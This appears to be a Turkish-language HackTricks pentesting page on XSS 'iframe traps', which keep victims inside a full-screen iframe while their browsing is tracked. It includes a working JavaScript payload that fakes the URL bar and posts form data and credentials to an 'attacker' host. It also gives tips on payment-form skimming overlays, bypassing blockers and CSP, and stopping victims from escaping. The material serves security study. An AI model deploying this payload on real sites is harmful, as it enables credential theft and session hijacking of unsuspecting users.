# Iframe Tuzakları

{{#include ../banners/hacktricks-training.md}}

## Temel Bilgiler

This form of abusing XSS via iframes to steal information from the user moving across the web page was originally published in these 2 post from trustedsec.com: [**here**](https://trustedsec.com/blog/persisting-xss-with-iframe-traps) **ve** [**here**](https://trustedsec.com/blog/js-tap-weaponizing-javascript-for-red-teams).

Saldırı, XSS'e karşı savunmasız bir sayfada başlar; burada **kurbanların XSS'ten ayrılmamalarını sağlamak** için tüm web uygulamasını kaplayan bir **iframe içinde gezinmeleri** sağlanabilir.

XSS saldırısı temelde web sayfasını ekranın %100'ünü kaplayan bir iframe içine yükler. Bu yüzden kurban **iframe içinde olduğunu fark etmeyecektir**. Ardından, kurban iframe içindeki bağlantılara tıklayarak sayfada gezinirse (web içinde), yüklenen keyfi JS ile **iframe içinde gezinmeye devam eder** ve bu gezinmeden bilgi çalınır.

Dahası, daha gerçekçi yapmak için bir iframe sayfanın konumunu değiştirdiğinde bunu kontrol etmek üzere bazı **listeners** kullanılabilir ve tarayıcının URL'si, kullanıcının tarayıcıyı kullanarak sayfalar arasında gezindiğini sandığı konumlarla güncellenebilir.

<figure><img src="../images/image (1248).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png">https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png</a></p></figcaption></figure>

<figure><img src="../images/image (1249).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png">https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png</a></p></figcaption></figure>

Ayrıca, listeners kullanarak sadece kurbanın ziyaret ettiği diğer sayfaları değil, aynı zamanda **doldurulan formlara** girilen verileri (kimlik bilgileri?) gönderme veya **local storage**'ı çalma gibi hassas bilgileri ele geçirmek mümkündür.

Elbette, ana sınırlamalar şunlardır: bir **kurbanın sekmeyi kapatması veya tarayıcıya başka bir URL yazması iframe'den kaçmasına** neden olur. Bunu yapmanın bir diğer yolu da **sayfayı yenilemek**tir; ancak bu, iframe içine yeni bir sayfa yüklendiğinde sağ tıklama bağlam menüsünü devre dışı bırakarak veya kullanıcının fare imlecinin iframe'den ayrıldığını fark ederek kısmen **engellenebilir** — potansiyel olarak kullanıcının tarayıcının yenile düğmesine tıklamasını önlemek amaçlanır; bu durumda tarayıcı URL'si XSS'e karşı savunmasız orijinal URL ile güncellenir, dolayısıyla kullanıcı tekrar yenilerse sayfa yeniden zehirlenir (bu çok gizli değildir).

## Modernleştirilmiş tuzak (2024+)

* Gerçek gezinmeyi taklit etmek için **full‑viewport iframe** ve History/Navigation API kullanın.

<details>
<summary>Full-viewport iframe tuzağı</summary>
```html
<script>
const i=document.createElement('iframe');
i.src=location.href;
i.style='position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
document.body.appendChild(i);
function sync(url){history.replaceState({},'',url);}
i.addEventListener('load',()=>{
const w=i.contentWindow;
['hashchange','popstate'].forEach(ev=>w.addEventListener(ev,()=>sync(w.location.href)));
w.addEventListener('click',()=>fetch('//attacker/log',{method:'POST',body:w.location.href}));
w.document.addEventListener('submit',ev=>{
const fd=new FormData(ev.target);
fetch('//attacker/creds',{method:'POST',body:new URLSearchParams(fd)});
},true);
});
</script>
```
</details>

* **Navigation API** (`navigation.navigate`, `currententrychange`) dış URL çubuğunu senkron tutar; gerçek URL'in leaking olmasını önlemez.
* Go **fullscreen** ile tarayıcı UI'sını gizleyin ve kendi sahte adres çubuğunuzu/kilid ikonunuzu çizin.

## Overlay & skimmer kullanımı

* Ele geçirilmiş satıcılar, hosted payment iframes (Stripe, Adyen, vb.)'yi **pixel‑perfect overlay** ile değiştirir; bu overlay gerçek frame altında kalırken tuş vuruşlarını iletir, bazen akışın bozulmaması için legacy validation API'lerini kullanır.
* Üst frame'de kullanıcıları hapsederek, URL çubuğunun hiç değişmediğini fark etmeden önce **autofill/password‑manager** verilerini yakalarsınız.

## 2025 araştırmasında gözlemlenen atlatma teknikleri

* `about:blank`/`data:` local frame'ler parent origin'i miras alır ve bazı içerik engelleyici heuristiklerini atlatır; iç içe iframeler, eklentiler üçüncü taraf çerçeveleri kaldırsa bile yeniden doğabilir.
* **Permission propagation**: parent `allow` attribute'unu yeniden yazarak iç içe geçmiş saldırgan frame'lere fullscreen/camera/microphone izinleri verebilirsiniz, belirgin DOM değişiklikleri olmadan.

## Hızlı OPSEC ipuçları

* Fare çıktığında (body üzerinde `mouseleave`) iframe'e yeniden odaklanın, böylece kullanıcıların tarayıcı UI'sına ulaşmasını engellersiniz.
* Frame içinde context menu'yu ve yaygın kısayolları (`keydown` için `F11`, `Ctrl+L`, `Ctrl+T`) devre dışı bırakın, böylece kaçma girişimlerini yavaşlatırsınız.
* Eğer CSP inline script'leri engelliyorsa, uzak bir bootstrapper enjekte edin ve iframe üzerinde `srcdoc`'u etkinleştirin; böylece payload'unuz ana sayfanın uygulanan CSP'sinin dışında barınır.

## İlgili

{{#ref}}
clickjacking.md
{{#endref}}



## References

- [Iframe security exposed: blind spot fueling payment skimmer attacks (2025)](https://thehackernews.com/2025/09/iframe-security-exposed-blind-spot.html)
- [Local Frames: exploiting inherited origins to bypass blockers (2025)](https://arxiv.org/abs/2506.00317)
{{#include ../banners/hacktricks-training.md}}
